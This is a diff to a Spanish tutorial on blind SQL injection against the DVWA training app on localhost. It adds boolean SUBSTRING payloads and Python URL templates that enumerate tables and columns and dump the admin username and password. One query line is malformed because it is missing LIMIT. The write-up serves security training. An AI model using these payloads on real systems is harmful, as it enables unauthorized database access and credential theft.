@@ -736,7 +736,9 @@ La consulta normal es:
 
 Pero adaptarlo a el codigo de python y url-encodeado quedaría así dentro de la variable url:
 
-`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(table_name,%d,1)+FROM+information_schema.tables+WHERE+table_schema+='dvwa'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)`
+```py
+url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(table_name,%d,1)+FROM+information_schema.tables+WHERE+table_schema+='dvwa'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)
+```
 
 Y también agregando los valores que iran fuzzeando las posiciones y caracteres.
 
@@ -756,7 +758,9 @@ Para descubrir el nombre de la segunda tabla es similar solo cambiaremos obviame
 
 Y de la variable URL donde se almacena la consulta que se probará para fuzzear cada posicion solo debemos cambiar el limit:
 
-`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(table_name,%d,1)+FROM+information_schema.tables+WHERE+table_schema+='dvwa'+limit+1,1)='%s'+--+-&Submit=Submit" % (position, character)`
+```py
+url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(table_name,%d,1)+FROM+information_schema.tables+WHERE+table_schema+='dvwa'+limit+1,1)='%s'+--+-&Submit=Submit" % (position, character)
+```
 
 Al ejecutar el script veremos el nombre de la segunda tabla:
 
@@ -799,7 +803,9 @@ Como esta vez no tenemos un aproximado de longitud para decirle al script cuando
 
 Ahora toca modificar la consulta de la variable url, esta consulta es la que mostre anteriormente pero adaptada a python:
 
-`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)`
+```py
+url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)
+```
 
 Después ejecutaremos el script y veremos lo siguiente:
 
@@ -807,13 +813,19 @@ Después ejecutaremos el script y veremos lo siguiente:
 
 Podemos ver que nos enumero el nombre de la primera columna, pero como no hay limite de caracteres el script sigue corriendo sin saber que ya no hay mas posiciones que enumerar, pero simplemente si vemos que el script ya no avanza despues de un rato podremos detenerlo con ctrl + c y así nos ahorrariamos hacer lo de obtener la longitud de cada columna ya que puede ser un poco tedioso.
 
-Así que haremos esto con las columnas restantes, jugando con cambiar el limit en cada ejecucion, y las consultas quedarian asi:
+Así que haremos esto con las columnas restantes, jugando con cambiar el limit en cada ejecucion del script, y las consultas quedarian asi:
 
-`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)`
+```py
+url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)
+```
 
-`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+2,1)='%s'+--+-&Submit=Submit" % (position, character)`
+```py
+url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+2,1)='%s'+--+-&Submit=Submit" % (position, character)
+```
 
-`url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'3,1)='%s'+--+-&Submit=Submit" % (position, character)`
+```py
+url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'3,1)='%s'+--+-&Submit=Submit" % (position, character)
+```
 
 Etc...
 
@@ -830,5 +842,71 @@ Una vez enumeradas todas los nombres de cada columna:
 
 Ya solo nos queda dumpear los datos de las columnas que nos interesan, en este caso es "user" y "password".
 
-Por lo que lo haremos con la siguiente consulta:
+Empezaremos por hacer la consulta para enumerar el usuario del primer registro:
+
+`1' AND (SELECT SUBSTRING(user,1,1) FROM dvwa.users LIMIT 1)='a' -- -`
+
+Como recordamos en esta consulta estamos obteniendo el valor del primer digito del nombre de usuario y lo estamos comparando con el valor "a".
+
+![a](/assets/images/DVWA-SQLi/SQLiBlind-easy/digitA.png)
+
+Podemos apreciar que nos respondio el valor True, por lo que podemos saber que el nombre del primer usuario empieza con "a".
+
+Y para verificar que todo este teniendo lógica pondremos la misma consulta pero con un valor que no sea "a", y nos debería de dar el resultado False para comprobar que nos esta interpretando correctamente las consultas y no caer en falsos positivos:
+
+`1' AND (SELECT SUBSTRING(user,1,1) FROM dvwa.users LIMIT 1)='b' -- -`
+
+Y nos responde:
+
+![b](/assets/images/DVWA-SQLi/SQLiBlind-easy/digitB.png)
+
+Por lo que podemos saber que esta consulta si nos esta interpretando correctamente todo, por lo que sabemos que empieza con "a".
+
+Ahora que ya descubrimos la consulta correcta lo que haremos es agregar al script esta consulta para facilitar la enumeracion de caracteres del primer usuario.
+
+Y las modificaciones del script ahora seran las siguientes:
+
+Como no sacamos la longitud del primer usuario pondremos un rango alto y detendremos el script cuando leamos que el usuario ya no avanza, por lo que el for quedaría así:
+
+`for position in range(1,51):`
+
+Y la consulta de la variable URL quedará:
+
+```py
+url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(user,%d,1)+FROM+dvwa.users+LIMIT+1)='%s'+--+-&Submit=Submit" % (position, character)
+```
+
+Es la misma que la anterior pero como ya sabemos esta adaptada para python, url-encodeada y con los valores que iran fuzzeando cada peticion.
+
+Después de estos cambios lo ejecutaremos y veremos que nos enumera el primer usuario:
+
+![admin](/assets/images/DVWA-SQLi/SQLiBlind-easy/admin.png)
+
+Podemos apreciar que al ejecutar el script el primer nombre de usuario que dumpeamos fue el de admin, por lo que ya encontramos el usuario que mas nos interesa, así que si quieres puedes enumerar los usuarios que siguen como ya sabemos cambiando el limit en el script y así obtener uno por uno, pero en este caso no lo haremos ya que hemos encontrado el importante.
+
+Ahora como recordamos también había otra columna llamada "password" que nos llamaba la atención, así que simplemente haremos la consulta para enumerar la contraseña del usuario admin:
+
+`1' AND (SELECT SUBSTRING(password,1,1) FROM dvwa.users WHERE user = 'admin' LIMIT 1)='a' -- -`
+
+Así que verificamos que funcione la logica de la consulta primero en BurpSuite y como funciono ya que descubrimos que el primer caracter es 5 ya que nos devolvio True, entonces ya sabemos que nos interpreta correctamente todo ya que al poner algun valor diferente a 5 nos devolvia False, por lo que ya esta lista la consulta para adaptarla a el script:
+
+`for position in range(1,51):`
+
+Esto ya sabemos que es por que no sacamos la longitud y no sabemos donde parara de recorrerse por lo que le damos un valor alto.
+
+```py
+url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(password,%d,1)+FROM+dvwa.users+WHERE+user+=+'admin'+limit+0,1)='%s'+--+-&Submit=Submit" % (position, character)
+```
+
+Esta consulta sabemos que es la misma que la anterior pero adaptada a python con sus valores a fuzzear en cada peticion.
+
+Y al ejecutar el script como podemos ver tendremos la password del usuario admin:
+
+![password](/assets/images/DVWA-SQLi/SQLiBlind-easy/password.png)
+
+Y ya hemos terminado el nivel Fácil de inyección SQL Blind.
+
+<br>
+
+# Inyección SQL Blind (ciega) - Nivel Intermedio
 
